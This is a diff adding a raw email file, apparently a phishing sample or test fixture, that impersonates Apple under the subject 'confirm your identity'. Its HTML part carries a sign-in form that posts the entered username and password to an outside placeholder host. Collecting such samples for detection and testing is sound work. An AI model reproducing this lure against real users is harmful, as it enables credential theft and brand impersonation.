@@ -1,0 +1,25 @@
+From: "Apple" <info@id-center93.test>
+To: victim@example.test
+Subject: Apple: confirm your identity
+Date: Thu, 05 Nov 2026 10:00:00 +0000
+Message-ID: <7686860044@id-center93.test>
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+ boundary="===============4746261284278555825=="
+
+--===============4746261284278555825==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Please view this message in an HTML-capable client.
+
+--===============4746261284278555825==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body><p>Sign in to continue.</p><form action=3D"https://service-help75=
+.test/post" method=3D"post"><input name=3D"u"><input type=3D"password" name=
+=3D"p"><input type=3D"submit"></form></body></html>
+
+--===============4746261284278555825==--
